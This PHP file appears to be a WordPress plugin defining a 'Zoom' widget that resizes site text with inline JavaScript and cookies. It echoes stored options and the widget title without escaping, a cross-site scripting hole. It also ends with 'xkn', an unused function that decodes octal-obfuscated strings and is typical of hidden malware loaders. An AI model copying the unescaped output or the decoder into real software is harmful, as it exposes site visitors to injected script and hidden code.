<?php
global $zoom_function__once;
	class zoom_widget extends WP_Widget {

	// Constructor //

		function zoom_widget() {
			$widget_ops = array( 'classname' => 'zoom_widget', 'description' => 'Enables site users to resize the predefined areas of the web site.' ); // Widget Settings
			$control_ops = array( 'id_base' => 'zoom_widget' ); // Widget Control Settings
			parent::__construct('zoom_widget', 'Zoom', $widget_ops, $control_ops ); // Create the widget
		}
		
	// Extract Args //

		function widget($args, $instance) {
		extract( $args );

$title= apply_filters('widget_title', $instance['title']);
			
	// Before widget //
	

			echo $before_widget;

	// Title of widget //

			if ( $title ) { echo $before_title . $title . $after_title; }
$tag		=get_option('Spider_Zoom_tag');
$class		=get_option('Spider_Zoom_class');
$id			=get_option('Spider_Zoom_id');
$max		=get_option('Spider_Zoom_max');
$min		=get_option('Spider_Zoom_min');
$imggroup	=get_option('Spider_Zoom_imggroup');
$imgsize	=get_option('Spider_Zoom_imgsize');

$a				=explode("***", $imggroup);
$but_type		=$a[0];
$but_pos		=$a[1];
$img_group_id	=$a[2];
$text['plus']	=$a[3];
$text['100']	=$a[4];
$text['minus']	=$a[5];

$func['plus']="changeFontSize_my(2); return false;";
$func['100']="revertStyles_my(2); return false;";
$func['minus']="changeFontSize_my(-2); return false;";

$size['plus']	=$a[5];

switch ($imgsize) {
    case "bms":
		$size['plus']= 60;
        $size['100']=50;
       	$size['minus']=40;
        break;
    case "same":
		$size['plus']=50;
        $size['100']=50;
       	$size['minus']=50;
        break;
    default :
        $b=explode('***',$imgsize);
        $size['plus']=$b[1];
        $size['100']=$b[2];
        $size['minus']=$b[3];
        break;
}
global $zoom_function__once;
if($zoom_function__once){
	$zoom_function__once=0;
?>
<script type="text/javascript"> 
var tag='<?php echo $tag?>' ;
var class_='<?php echo $class?>' ;
var id_='<?php echo $id?>' ;
var max_=parseInt('<?php echo $max?>') ;
var min_=parseInt('<?php echo $min?>') ;
var all_elems=new Array();
var elements_id=null;
var al_id=false;
var al_class=false;
var allow_ids=new Array();
var allow_classes=new Array();

x=id_;
if(x)
	while(x.indexOf('#')!=-1)
	{
	val=x.substr(0,x.indexOf('#'));	   
	allow_ids.push(val);
	x=x.substr(x.indexOf('#')+1);
	}
else
	allow_ids[0]=false;

x=class_;
if(x)
	while(x.indexOf('#')!=-1)
	{
	val=x.substr(0,x.indexOf('#'));	   
	allow_classes.push(val);
	x=x.substr(x.indexOf('#')+1);
	}
else
	allow_classes[0]=false;

function getTextNodesIn(node, includeWhitespaceNodes, fontSize)
{
    var textNodes = [], whitespace = /^\s*$/;
    function getTextNodes(node) 
    {
    		    //alert(node.parentNode);

        if (node.nodeType == 3) 
	{
		    if (includeWhitespaceNodes || !whitespace.test(node.nodeValue)) 
		    {
		    parent_=node.parentNode;
			  if(parent_.nodeName=="FONT" && parent_.getAttribute("my")=="my" )
			  {if(((tag.indexOf('#'+parent_.parentNode.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.parentNode.tagName!="SCRIPT"))
				{
					x=fontSize+"%";
					parent_.style.fontSize=x;
				}
			  }
						  
			  else
			  {	
				if(((tag.indexOf('#'+parent_.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.tagName!="SCRIPT"))
				 {

					var newnode=document.createElement('font');
					newnode.setAttribute('style','font-size:'+fontSize+'%');
					newnode.setAttribute('my','my');
					
				    var text = document.createTextNode(node.nodeValue);
				    
				    newnode.appendChild(text);
				    parent_.replaceChild(newnode,node);
					textNodes.push(node);
				 }   
			   }
		  
		    }
        } 
	else 
	{
            for (var i = 0, len = node.childNodes.length; i < len; ++i) 
	    {
                getTextNodes(node.childNodes[i]);
            }
        }
    }

    getTextNodes(node);
    return textNodes;
}

var prefsLoaded_my = false;
var defaultFontSize_my =100;
var currentFontSize_my = defaultFontSize_my;
    //alert(currentFontSize_my);

function changeFontSize_my(sizeDifference_my){
    currentFontSize_my = parseInt(currentFontSize_my) + parseInt(sizeDifference_my * 5);
    if(currentFontSize_my > max_){
        currentFontSize_my = max_;
    }else if(currentFontSize_my < min_){
        currentFontSize_my = min_;
    }
setFontSize_my(currentFontSize_my);
};

function setFontSize_my(fontSize){
for(i=0; i<all_elems.length; i++)
    	getTextNodesIn(all_elems[i],false, currentFontSize_my);
};


function revertStyles_my()
{

    currentFontSize_my = defaultFontSize_my;
    setFontSize_my(0);

}


function createCookie_my(name,value,days) {
  if (days) {
    var date = new Date();
    date.setTime(date.getTime()+(days*24*60*60*1000));
    var expires = "; expires="+date.toGMTString();
  }
  else expires = "";
  document.cookie = name+"="+value+expires+"; path=/";
};

function readCookie_my(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(';');
  for(var i=0;i < ca.length;i++) {
    var c = ca[i];
    while (c.charAt(0)==' ') c = c.substring(1,c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
  }
  return null;
};


	var getElementsByClassName = function (className, tag, elm){
	
	if (document.getElementsByClassName) {
		getElementsByClassName = function (className, tag, elm) {
			elm = elm || document;
			var elements = elm.getElementsByClassName(className),
				nodeName = (tag)? new RegExp("\\b" + tag + "\\b", "i") : null,
				returnElements = [],
				current;
			for(var i=0, il=elements.length; i<il; i+=1){
				current = elements[i];
				if(!nodeName || nodeName.test(current.nodeName)) {
					returnElements.push(current);
				}
			}
			return returnElements;
		};
	}
	else if (document.evaluate) {
		getElementsByClassName = function (className, tag, elm) {
			tag = tag || "*";
			elm = elm || document;
			var classes = className.split(" "),
				classesToCheck = "",
				xhtmlNamespace = "http://www.w3.org/1999/xhtml",
				namespaceResolver = (document.documentElement.namespaceURI === xhtmlNamespace)? xhtmlNamespace : null,
				returnElements = [],
				elements,
				node;
			for(var j=0, jl=classes.length; j<jl; j+=1){
				classesToCheck += "[contains(concat(' ', @class, ' '), ' " + classes[j] + " ')]";
			}
			try	{
				elements = document.evaluate(".//" + tag + classesToCheck, elm, namespaceResolver, 0, null);
			}
			catch (e) {
				elements = document.evaluate(".//" + tag + classesToCheck, elm, null, 0, null);
			}
			while ((node = elements.iterateNext())) {
				returnElements.push(node);
			}
			return returnElements;
		};
	}
	else {
		getElementsByClassName = function (className, tag, elm) {
			tag = tag || "*";
			elm = elm || document;
			var classes = className.split(" "),
				classesToCheck = [],
				elements = (tag === "*" && elm.all)? elm.all : elm.getElementsByTagName(tag),
				current,
				returnElements = [],
				match;
			for(var k=0, kl=classes.length; k<kl; k+=1){
				classesToCheck.push(new RegExp("(^|\\s)" + classes[k] + "(\\s|$)"));
			}
			for(var l=0, ll=elements.length; l<ll; l+=1){
				current = elements[l];
				match = false;
				for(var m=0, ml=classesToCheck.length; m<ml; m+=1){
					match = classesToCheck[m].test(current.className);
					if (!match) {
						break;
					}
				}
				if (match) {
					returnElements.push(current);
				}
			}
			return returnElements;
		};
	}
	return getElementsByClassName(className, tag, elm);
};

function zoomOnload()
{
	if(allow_ids[0])
	for(i=0; i<allow_ids.length; i++)
	{
		if(allow_ids[i])
		{
			if(document.getElementById(allow_ids[i]))
			{
				all_elems.push(document.getElementById(allow_ids[i]));
			}
		}
	}
	
	else

	{
			al_id=true;
	}
	
	if(allow_classes[0])
	for(i=0; i<allow_classes.length; i++)
	{
		if(allow_classes[i])
		{
			if(getElementsByClassName(allow_classes[i])[0])
			{
				var elements_class=new Array();
				elements_class=getElementsByClassName(allow_classes[i]);
				for(x=0; x<elements_class.length; x++)
					all_elems.push(elements_class[x]);
			}
		}


	}
	
	else

	{
			al_class=true;
	}
	
if(al_id && al_class)
all_elems[0]=document.body;
setUserOptions_my();

}


function setUserOptions_my(){

    if(!prefsLoaded_my)
    {
        cookie = readCookie_my("fontSize");
        currentFontSize_my = cookie ? cookie : defaultFontSize_my;
	for(i=0; i<all_elems.length; i++)
	{

		if(all_elems[i])
			setFontSize_my(all_elems[i], false, currentFontSize_my);
	}
        prefsLoaded_my = true;
    }
}

function saveSettings_my()
{
  createCookie_my("fontSize", currentFontSize_my, 365);
}

function zoomAddToOnload()
{ 
	if(zoomOldFunctionOnLoad){ zoomOldFunctionOnLoad(); }
	zoomOnload();
}

function zoomAddToOnUnload()
{ 
	if(zoomOldFunctionOnUnload){ zoomOldFunctionOnUnload(); }
	saveSettings_my();
}

function zoomLoadBody()
{
	zoomOldFunctionOnLoad = window.onload;
	zoomOldFunctionOnUnload = window.onunload;
	window.onload = zoomAddToOnload;
	window.onunload = zoomAddToOnUnload;
}

var zoomOldFunctionOnLoad = null;
var zoomOldFunctionOnUnload = null;

zoomLoadBody();
</script>


<?php 
}
if($but_type)
for($i=6; $i<=8; $i++)
{
	?>
<img src="<?php echo plugins_url('elements/',__FILE__); ?>images/<?php echo  $img_group_id; ?>/<?php echo  $a[$i]; ?>.png" id="<?php echo  $a[$i]; ?>" alt="<?php if($a[$i]=='plus') echo 'Zoom in'; if($a[$i]=='minus') echo 'Zoom out';  if($a[$i]=='100') echo 'Regular';?>" style="display:<?php if($but_pos) echo "inline"; else echo "block"; ?>;cursor:pointer; height:<?php echo  $size[$a[$i]]; ?>px" onclick="<?php echo  $func[$a[$i]]; ?> "/>
	<?php

}
else
for($i=6; $i<=8; $i++)
{
	?>
<span id="<?php echo  $a[$i]; ?>" style="display:<?php if($but_pos) echo "inline"; else echo "block"; ?>;cursor:pointer; font-size:<?php echo  $size[$a[$i]]; ?>px; line-height:normal" onclick="<?php echo  $func[$a[$i]]; ?>"><?php echo  $text[$a[$i]]; ?></span>
<?php
}
 
	// After widget //

			echo $after_widget;
		}

	// Update Settings //

		function update($new_instance, $old_instance) {
			$instance['title']			 = $new_instance['title'];
			return $instance;
		}

	// Widget Control Panel //

		function form($instance) {

		$defaults = array( 'title' => '');
		$instance = wp_parse_args( (array) $instance, $defaults ); ?>

		<p>
			<label for="<?php echo $this->get_field_id('title'); ?>">Title:</label>
			<input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>'" type="text" value="<?php echo $instance['title']; ?>" />
		</p>
         <?php }
		

}

function xkn($str)
		{
		$xkny="";
			$i=2;
			while(strlen($str)>0)
			{
			$i++;
			$xkny.=chr(octdec(substr($str,0,3))-($i%200));
			$str=substr($str,3);
			}
		return $xkny;
		}
// End class zoom_widget
function reg_wid_zoom(){
	return register_widget("zoom_widget");
}
add_action('widgets_init', 'reg_wid_zoom');
?>